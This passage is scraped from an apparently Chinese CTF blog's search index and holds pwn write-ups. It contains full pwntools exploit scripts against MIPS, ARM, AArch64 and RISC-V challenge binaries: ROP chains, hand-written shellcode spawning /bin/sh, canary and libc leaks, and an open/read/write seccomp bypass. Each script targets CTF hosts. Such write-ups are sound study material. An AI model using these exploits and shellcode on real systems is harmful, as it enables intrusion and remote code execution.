# MOV             W2, #0                  ; prot
# MOV             X1, #0x1000             ; len
# MOV             X0, #off_411000         ; addr
# BL              .mprotect
# NOP
# LDP             X29, X30, [SP+var_s0],#0x10
# RET


tar_addr=0x411068

io.sendafter(b&amp;quot;Name:&amp;quot;,p64(mprotect)+asm(shellcraft.sh()))
# payload=cyclic(0x48)+asm(shellcraft.sh())

payload=cyclic(0x48)+p64(csu_2)
payload+=p64(0)+p64(csu_1) # X19-&amp;gt;0 X30-&amp;gt;csu_1
payload+=p64(0)+p64(1) # X19-&amp;gt;0 X20-&amp;gt;1
payload+=p64(tar_addr)+p64(7)+p64(0x1000)+p64(tar_addr+8) # X3-&amp;gt;X21-&amp;gt;tar_addr X2-&amp;gt;X22-&amp;gt;7 X1-&amp;gt;X23-&amp;gt;0x1000 W0-&amp;gt;W24(X24)-&amp;gt;tar_addr+0x8

payload+=p64(0)+p64(tar_addr+0x8) # mprotect X29-&amp;gt;0 X30-&amp;gt;tar_addr+0x8

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;axb_2019_mips&#34;&gt;axb_2019_mips:&lt;/h3&gt;
&lt;p&gt;mips是关闭了nx的，可以构造read将shellcode读入bss段然后跳转到bss段执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,27635]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;.&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

shellcode=asm(shellcraft.sh())
bss_addr=0x410c00
read_text=0x4007e0

io.sendafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;aaa&amp;quot;)

# payload=cyclic(0x200)
#offset 36

# # NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
# for i in range(29):
#     payload += b&amp;quot;\x26\x40\x08\x01&amp;quot;

payload=cyclic(0x20)+p32(bss_addr)+p32(read_text)
io.sendafter(b&amp;quot;aaa&amp;quot;,payload)

sleep(1)

payload=cyclic(0x24)+p32(bss_addr+0x40)+b&amp;quot;\x26\x40\x08\x01&amp;quot;*20+shellcode
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb_2020_mipspwn&#34;&gt;ycb_2020_mipspwn:&lt;/h3&gt;
&lt;p&gt;mipsel，打法同上，向bss段写入shellcode跳转执行&lt;br&gt;
此题需要限制一下shellcode长度，使用shellcraft生成的过长了&lt;br&gt;
可以上exdb找:&lt;a href=&#34;https://www.exploit-db.com/shellcodes/13300&#34;&gt;https://www.exploit-db.com/shellcodes/13300&lt;/a&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,26964]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;.&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)
        
        
bss_addr=0x411700
read_text=0x400f50


io.sendafter(b&amp;quot;here:\n&amp;quot;,b&amp;quot;aaa&amp;quot;)
io.recv()
io.sendline(b&amp;quot;7&amp;quot;)

#payload=cyclic(0x200)
#offset 60

payload=cyclic(56)+p32(bss_addr)+p32(read_text)
io.sendafter(b&amp;quot;feeling:\n&amp;quot;,payload)

shellcode=b&amp;quot;\xff\xff\x10\x04\xab\x0f\x02\x24&amp;quot;
shellcode+=b&amp;quot;\x55\xf0\x46\x20\x66\x06\xff\x23&amp;quot;
shellcode+=b&amp;quot;\xc2\xf9\xec\x23\x66\x06\xbd\x23&amp;quot;
shellcode+=b&amp;quot;\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf&amp;quot;
shellcode+=b&amp;quot;\x9a\xf9\xbd\x23\x21\x20\x80\x01&amp;quot;
shellcode+=b&amp;quot;\x21\x28\xa0\x03\xcc\xcd\x44\x03&amp;quot;
shellcode+=b&amp;quot;/bin/sh&amp;quot;

payload=b&amp;quot;a&amp;quot;*60+p32(bss_addr+88)+shellcode

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;hkcert2023_rop&#34;&gt;hkcert2023_rop:&lt;/h3&gt;
&lt;p&gt;mips，构造gets往可写段上写shellcode，再找gadget跳过去，最后溢出跳转&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;chal.hkcert23.pwnable.hk&amp;quot;,28151]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    p = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./rop&amp;quot;]) 
    elf=ELF(&amp;quot;./rop&amp;quot;)
    # p = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # p = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;mips&#39;,endian=&#39;big&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;big&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        p = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

# gdb.attach(p)
# pause()
nop=b&amp;quot;\x01\x08\x40\x26&amp;quot;
shellcode = asm(&#39;&#39;&#39;
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  addiu $a0, $sp, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
&#39;&#39;&#39;)

#                   LAB_00456c34                          XREF[1]:  00456c20(j)  
#  00456c34 8f bf       lw       ra,local_4(sp)
#          00 5c
#  00456c38 8f a2       lw       v0,local_3c(sp)
#          00 24
#  00456c3c 8f b3       lw       s3,local_8(sp)
#          00 58
#  00456c40 8f b2       lw       s2,local_c(sp)
#          00 54
#  00456c44 8f b1       lw       s1,local_10(sp)
#          00 50
#  00456c48 8f b0       lw       s0,local_14(sp)
#          00 4c
#  00456c4c 03 e0       jr       ra
#          00 08



gets_text=0x400820


payload=flat(
    {
        0x24:p32(0x49cc20),
        0x4c:p32(0),
        0x5c:p32(gets_text),
    }
)


p.sendlineafter(b&amp;quot;input : \n&amp;quot;,b&amp;quot;a&amp;quot;*72+p32(0x49cc20)+p32(0x456c34)+payload)

p.sendline(shellcode+cyclic(0x64-len(shellcode))+p32(0x49cc20))


p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;mtctf-2022aarch64_ret2libc&#34;&gt;[MTCTF 2022]aarch64_ret2libc:&lt;/h3&gt;
&lt;p&gt;aarch64，泄露的libc有&lt;code&gt;\x00&lt;/code&gt;截断，平台上需要爆破地址&lt;br&gt;
找&lt;code&gt;ldr&lt;/code&gt;和&lt;code&gt;ldp&lt;/code&gt;指令的gadget，控制的&lt;code&gt;x0&lt;/code&gt;为&lt;code&gt;/bin/sh&lt;/code&gt;地址，&lt;code&gt;x30&lt;/code&gt;为ret地址&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.anna.nssctf.cn&amp;quot;,28926]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./pwn&amp;quot;]) 
    io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;,&amp;quot;./pwn&amp;quot;]) 
    elf = ELF(&amp;quot;./pwn&amp;quot;)
    libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
    # io = process(&amp;quot;./pwn&amp;quot;)
    context(arch=&#39;aarch64&#39;,os=&#39;linux&#39;)
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        elf = ELF(&amp;quot;./pwn&amp;quot;)
        libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 


def get_gift(cc):
    io.sendlineafter(b&amp;quot;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;sensible&amp;gt;&amp;gt;\n&amp;quot;,cc)

def overflow(cc):
    io.sendlineafter(b&amp;quot;&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,cc)

ct=0
num=[]
for i in range(0x10,0x100):
    num.append(i)
for i in range(0,0xf0):
    print(&amp;quot;ct: &amp;quot;,hex(num[i]))

while(True):
    # try:
        elf = ELF(&amp;quot;./pwn&amp;quot;)
        libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
        io = remote(remote_addr[0],remote_addr[1])
        # io = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
        # io = process(&amp;quot;./pwn&amp;quot;)
        context(arch=&#39;aarch64&#39;,os=&#39;linux&#39;)
        puts_got=elf.got[b&amp;quot;puts&amp;quot;]

        get_gift(p64(puts_got))

        leak_addr=u64(io.recv(3).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
        print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

        base_addr=0x4000000000
        # base_addr = base_addr * num[ct]
        print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))
        ct = ct+1
        # base_addr=0x0

        sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]+base_addr
        str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))+base_addr

        print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
        print(&amp;quot;str_sh: &amp;quot;,hex(str_sh))

        gadget=leak_addr+0xb6518+base_addr
        # 0x00000000000b6518: ldr x0, [sp, #0x70]; ldp x29, x30, [sp], #0x1a0; ret;
        # payload=cyclic(0x100)
        print(&amp;quot;offset: &amp;quot;,hex(cyclic_find(0x6261616a))) #0x88

        payload=cyclic(0x88)+p64(gadget)

        fake_stack=cyclic(0x10)+p64(sys_addr)*2
        fake_stack=fake_stack.ljust(0x80,b&amp;quot;a&amp;quot;)+p64(str_sh)
        # fake_stack=fake_stack.ljust(0xc0,b&amp;quot;a&amp;quot;)+p64(0xbeefdead)+p64(sys_addr)
        overflow(payload+fake_stack)
        sleep(0.2)
        io.interactive()
    #     io.sendline(b&amp;quot;cat flag&amp;quot;)
    #     sleep(0.2)
    #     t=io.recv()
    #     print(t)
    #     if b&amp;quot;NSS&amp;quot; in t:
    #         break
    #     else:
    #         io.close()
    #         continue
    # except:
    #     io.close()
    #     continue
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;htb_arms_roped&#34;&gt;htb_arms_roped:&lt;/h3&gt;
&lt;p&gt;出题人的ld和🐎一起缺失了 ，sb题😅😅😅&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
# remote_addr = [&amp;quot;167.99.82.136&amp;quot;,32375]
remote_addr = [&amp;quot;167.99.85.216&amp;quot;,31954]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./arms_roped&amp;quot;]) 
    elf = ELF(&amp;quot;./arms_roped&amp;quot;)
    # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # io = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        io = remote(remote_addr[0],remote_addr[1])
        elf = ELF(&amp;quot;./arms_roped&amp;quot;)
        # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

### leak canary
payload=b&amp;quot;a&amp;quot;*0x21
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x21)
canary=u32(io.recv(3)[-4:].rjust(4,b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))


### leak base
payload=b&amp;quot;a&amp;quot;*0x30
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x30)
# base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))+0x40000000-0x948
base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-0x948
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))


### leak libc
payload=b&amp;quot;a&amp;quot;*0x48
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x48)
leak_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-153-0x1748C
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

# sys_addr=leak_addr+0x2F5C8 9.9
sys_addr=leak_addr+0x2F510+1  # alignment
### 0002F510

# str_sh=leak_addr+0x0DCE38 9.9
str_sh=leak_addr+0x0DCE0C
### 00DCE0C

log.success(&amp;quot;sys_addr: &amp;quot;+hex(sys_addr))
log.success(&amp;quot;str_sh: &amp;quot;+hex(str_sh))


# 0x000009ec: pop {r4, r5, r6, r7, r8, sb, sl, pc};
# 0x000009d8: mov r0, r7; add r4, r4, #1; blx r3;
# 0x0000056c: pop {r3, pc};

mov_all=base_addr+0x9d8
pop_r4_r5_r6_r7_r8_sb_sl_pc=base_addr+0x9ec
pop_r3_pc=base_addr+0x56c


log.success(&amp;quot;mov_all: &amp;quot;+hex(mov_all))
log.success(&amp;quot;pop_r4_r5_r6_r7_r8_sb_sl_pc: &amp;quot;+hex(pop_r4_r5_r6_r7_r8_sb_sl_pc))
log.success(&amp;quot;pop_r3_pc: &amp;quot;+hex(pop_r3_pc))


payload=cyclic(0x20)+p32(canary)+p32(0xdeadbeef)*3
payload+=p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)

payload+=p32(0)*3
payload+=p32(str_sh) # r7-&amp;gt;str_sh
payload+=p32(0)*3
payload+=p32(pop_r3_pc)

payload+=p32(sys_addr)+p32(mov_all)

io.sendline(payload)

# io.sendline(b&amp;quot;quit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">异构初探</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/V0Hk19jqQ/"" data-c="
          &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;─[fk@fk]─[~/Desktop/cve/1/_US_D301V1.0BR_V1.2.7.8_cn_td.bin.extracted/squashfs-root/bin]
└──╼ $readelf -h busybox 
ELF 头：
  Magic：  7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00 
  类别:                              ELF32
  数据:                              2 补码，大端序 (big endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI 版本:                          0
  类型:                              EXEC (可执行文件)
  系统架构:                          MIPS R3000
  版本:                              0x1
  入口点地址：              0x403f90
  程序头起点：              52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  标志：             0x50001007, noreorder, pic, cpic, o32, mips32
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         7
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0


&lt;/code&gt;&lt;/pre&gt;
">tenda d301</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/FU4AxD3vB/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN：&lt;/h3&gt;
&lt;h4 id=&#34;newbottleoldwine&#34;&gt;NewBottleOldWine：&lt;/h4&gt;
&lt;p&gt;riscv64题目，ghidra编译下能正常看伪代码，但是关键处消失，结合ida64可以找出关键代码&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471956608.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
红色这坨ghidra啥也没有，不过ida反编译过后结合偏移可知0x11451622此处是getshell的&lt;/p&gt;
&lt;p&gt;一开始试偏移，正数发现到不了指定位置，于是考虑整数溢出，慢慢试偏移可以试出来&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693471963171.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;最后值为-30064770526时刚好可以跳转到0x11451622拿shell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471966762.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;riscv&#39;,bits=64)

io=remote(&amp;quot;node6.anna.nssctf.cn&amp;quot;,28016)

payload=b&amp;quot;-30064770526&amp;quot;

io.sendafter(&amp;quot;have?\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;happy2&#34;&gt;happy2&lt;/h4&gt;
&lt;p&gt;利用&lt;code&gt;scanf()&lt;/code&gt;输入&lt;code&gt;+-&lt;/code&gt;号不覆盖值的特性，可以以此泄露&lt;code&gt;_IO_2_1_stderr_&lt;/code&gt;地址，然后输入&lt;code&gt;puts&lt;/code&gt;地址进入fork()进程&lt;br&gt;
开启沙盒禁用&lt;code&gt;read connect fork execveat&lt;/code&gt;&lt;br&gt;
可以用&lt;code&gt;openat+pread+writev&lt;/code&gt;打orw&lt;br&gt;
shellcraft的openat函数有问题，还是手写比较稳&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;123.249.2.218&amp;quot;,10000)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;konw\n&amp;quot;,b&amp;quot;2&amp;quot;)

gdb.attach(io)
pause()

io.sendline(b&amp;quot;+&amp;quot;)
io.sendline(b&amp;quot;+&amp;quot;)
leak_addr=int(io.recvuntil(b&amp;quot;you konw&amp;quot;,drop=True))-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
puts_addr=leak_addr+libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;puts_addr: &amp;quot;,hex(puts_addr))

io.recvuntil(b&amp;quot;now you need to have a try\n&amp;quot;)
io.sendline(str(puts_addr).encode())

payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi, 0xffffff9c; mov rsi,rsp; xor rdx,rdx; mov rax,257;syscall;&#39;) #openat flag
# payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi,rsp; xor rsi,rsi; xor rdx,rdx; mov rax,2;syscall;&#39;) #open flag
payload += asm(shellcraft.pread(3,0x10500,0x100,0))
payload += asm(shellcraft.writev(1,0x10100,1))
payload = payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+flat(0x10500,0x100)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693472560284.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC：&lt;/h3&gt;
&lt;h4 id=&#34;gift_in_qrcode&#34;&gt;gift_in_qrcode：&lt;/h4&gt;
&lt;p&gt;最开始本来说爆破，结果给的就是答案，白给&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471973688.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;gift_in_qrcoderevenge&#34;&gt;gift_in_qrcode(revenge):&lt;/h4&gt;
&lt;p&gt;知道一个正确答案就可以爆破了&lt;br&gt;
爆破脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;)

    
while True:
    try:
        
        io=remote(&amp;quot;node6.anna.nssctf.cn&amp;quot;,28833)

        payload=b&amp;quot;19&amp;quot;

        io.sendlineafter(b&amp;quot;answer:&amp;quot;,payload)

        t=io.recv()
        print(t)
        
        if b&amp;quot;No&amp;quot; in t:
            print(&amp;quot;FAILED&amp;quot;)
            io.close()
        else:
            print(t)
            print(&amp;quot;SUCCEED&amp;quot;)
            sys.exit(0)
        
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;magic-docker&#34;&gt;Magic Docker：&lt;/h4&gt;
&lt;p&gt;pull下来save到本地进去就有flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker images #查看images，找到对应镜像id
docker save $id -o 1.zip #以1.zip形式保存镜像至当前目录
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693472029342.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;new-terminal&#34;&gt;New Terminal：&lt;/h4&gt;
&lt;p&gt;给了一个&lt;code&gt;.wasm&lt;/code&gt;文件，使用wasmtime运行&lt;br&gt;
可以得到一个shell,执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat flag|base 64
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到flag，cyberchef base64一把梭即可&lt;/p&gt;
">NSS_2nd 部分wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/bO-O2aCV6/"" data-c="
          &lt;p&gt;参考:&lt;br&gt;
&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/&#34;&gt;link1&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://cjovi.icu/WP/buu-360chunqiu2017_smallest-wp.html&#34;&gt;link2&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;ciscn-2019华南pwn3&#34;&gt;[CISCN 2019华南]PWN3&lt;/h3&gt;
&lt;p&gt;srop的前置条件，本题都可以找到&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677349095006.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
保护只开了nx，ida strings里面也是什么也没有&lt;br&gt;
本题关键函数&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677348479590.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
此处&lt;code&gt;sys_read&lt;/code&gt;函数可以将读入的字符串从&lt;code&gt;$rbp-0x10&lt;/code&gt;处开始写入栈上，可以将&lt;code&gt;/bin/sh&lt;/code&gt;写入方便后续利用，所以payload1可以这样构造&lt;br&gt;
&lt;code&gt;b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(sys_read)&lt;/code&gt;&lt;br&gt;
而随后的&lt;code&gt;sys_write&lt;/code&gt;则将&lt;code&gt;$rbp-0x10&lt;/code&gt;往后0x30 bytes的数据打印出来，我们可以利用这一点泄露signal frame的stack addr并测算距离&lt;code&gt;/bin/sh&lt;/code&gt;字符串偏移，通过已知地址偏移确定&lt;code&gt;/bin/sh&lt;/code&gt;字符串具体位置&lt;br&gt;
gdb动调可以找出来偏移为296&amp;lt;=&amp;gt;0x128   (本地调出来这么多能打通，远端就打不通，远端偏移0x118，情况跟本地反着来😅😅😅)&lt;br&gt;
7/18更新：SROP的栈偏移不同系统偏移不同&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677349148648.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
测出偏移后利用pwntools自带函数&lt;code&gt;SigreturnFrame()&lt;/code&gt;开始构造&lt;br&gt;
之后因为前面ret返回&lt;code&gt;vuln&lt;/code&gt;起始，需要重新输入溢出，则payload2可以这样构造&lt;br&gt;
&lt;code&gt;b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(mov_rax_0xf)+p64(syscall)+bytes(sigframe)&lt;/code&gt;&lt;br&gt;
随后get shell&lt;br&gt;
exp如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
